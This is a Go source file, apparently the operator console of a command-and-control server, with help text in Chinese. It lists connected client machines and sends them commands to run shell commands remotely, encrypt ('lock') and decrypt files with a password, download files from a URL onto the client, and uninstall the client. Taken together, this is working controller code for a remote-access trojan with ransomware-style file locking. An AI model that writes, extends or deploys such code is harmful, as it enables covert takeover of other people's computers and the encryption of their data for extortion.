package basic

import (
	"fmt"
	"strconv"
	"strings"

	"golang.org/x/text/encoding/simplifiedchinese"
)

const (
	GET_NAME = "who"
	SET_NAME = "name"
	EXEC     = "exec"
	LOCK     = "lock"
	UNLOCK   = "unlock"
	UNINST   = "uninst"
	DOWNLOAD = "download"
)

func CmdFormat(code string, paras []string) string {
	return code + ":" + strings.Join(paras, ",") + "|"
}

func CmdSend(code string, para []string) (id int, ok bool) {
	if len(para) >= 2 {
		id, err := strconv.Atoi(para[0])
		if err != nil {
			fmt.Println("id不合法")
			return -1, false
		}
		if _, ok = Clients[id]; !ok {
			fmt.Println("无该客户id")
			return -1, false
		}
		_, err = Clients[id].socket.Write([]byte(CmdFormat(code, para[1:])))
		if err != nil {
			Clients[id].socket.Close()
			fmt.Println("ID: " + para[0] + "\tName: " + Clients[id].name + "\t离开")
			delete(Clients, id)
			return -1, false
		}
		return id, true
	} else {
		fmt.Println("命令有误，输入help查看帮助")
		return -1, false
	}
}

func Dispatch(cmd_line string) {
	line := strings.Split(cmd_line, " ")
	var cmd = line[0]
	var para = line[1:]
	if cmd == "help" {
		cmd_help()
	} else if cmd == "list" {
		cmd_list()
	} else if cmd == "ping" {
		cmd_ping()
	} else if cmd == "name" {
		cmd_name(para)
	} else if cmd == "exec" {
		cmd_exec(para)
	} else if cmd == "lock" {
		cmd_lock(para)
	} else if cmd == "unlock" {
		cmd_unlock(para)
	} else if cmd == "uninst" {
		cmd_uninst(para)
	} else if cmd == "download" {
		cmd_download(para)
	} else {
		fmt.Println("Invalid Command")
	}
}

func cmd_help() {
	fmt.Println("help\t\t查看帮助\t\t\thelp")
	fmt.Println("list\t\t查看在线客户\t\t\tlist")
	fmt.Println("ping\t\t去掉离线用户\t\t\tping")
	fmt.Println("name\t\t重命名客户\t\t\tname id NewName")
	fmt.Println("exec\t\t远程执行cmd命令\t\t\texec id cmd_command_and_args")
	fmt.Println("exec\t\t设置绝对路径目录\t\texec id cd absolutePath")
	fmt.Println("exec\t\t设置绝对路径cmd目录\t\texec id path absolutePath")
	fmt.Println("lock\t\t文件加密\t\t\tlock id filePath pwd(16) extent(KB)")
	fmt.Println("unlock\t\t文件解密\t\t\tunlock id filePath pwd(16) extent(KB)")
	fmt.Println("uninst\t\t卸载客户端\t\t\tuninst id yes")
	fmt.Println("download\t远程下载文件\t\t\tdownload id url filePath")
}

func cmd_ping() {
	for k, v := range Clients {
		_, err := v.socket.Write([]byte(CmdFormat("ping", nil)))
		if err != nil {
			fmt.Println("客户ID: " + strconv.Itoa(int(v.id)) + "\tName: " + v.name + "\t已离线")
			v.socket.Close()
			delete(Clients, k)
		}
	}
}

func cmd_list() {
	fmt.Println("ID\t", "Name")
	for _, v := range Clients {
		fmt.Println(v.id, "\t", v.name)
	}
}

func cmd_name(para []string) {
	id, ok := CmdSend(SET_NAME, para)
	if ok {
		Clients[id].name = para[1]
	}
}

func cmd_exec(para []string) {
	id, ok := CmdSend(EXEC, para)
	if ok {
		var buf = make([]byte, 4100)
		len, _ := Clients[id].socket.Read(buf)
		decoder := simplifiedchinese.GBK.NewDecoder()
		converted, _ := decoder.Bytes(buf[0:len])
		fmt.Print(string(converted))
		fmt.Println()
	}
}

func cmd_lock(para []string) {
	id, ok := CmdSend(LOCK, para)
	if ok {
		var buf = make([]byte, 1024)
		len, _ := Clients[id].socket.Read(buf)
		fmt.Print(string(buf[:len]))
		fmt.Println()
	}
}

func cmd_unlock(para []string) {
	id, ok := CmdSend(UNLOCK, para)
	if ok {
		var buf = make([]byte, 1024)
		len, _ := Clients[id].socket.Read(buf)
		fmt.Print(string(buf[:len]))
		fmt.Println()
	}
}

func cmd_uninst(para []string) {
	id, ok := CmdSend(UNINST, para)
	if ok {
		var buf = make([]byte, 1024)
		len, _ := Clients[id].socket.Read(buf)
		fmt.Print(string(buf[:len]))
		fmt.Println()
	}
}

func cmd_download(para []string) {
	id, ok := CmdSend(DOWNLOAD, para)
	if ok {
		var buf = make([]byte, 1024)
		len, _ := Clients[id].socket.Read(buf)
		fmt.Print(string(buf[:len]))
		fmt.Println()
	}
}
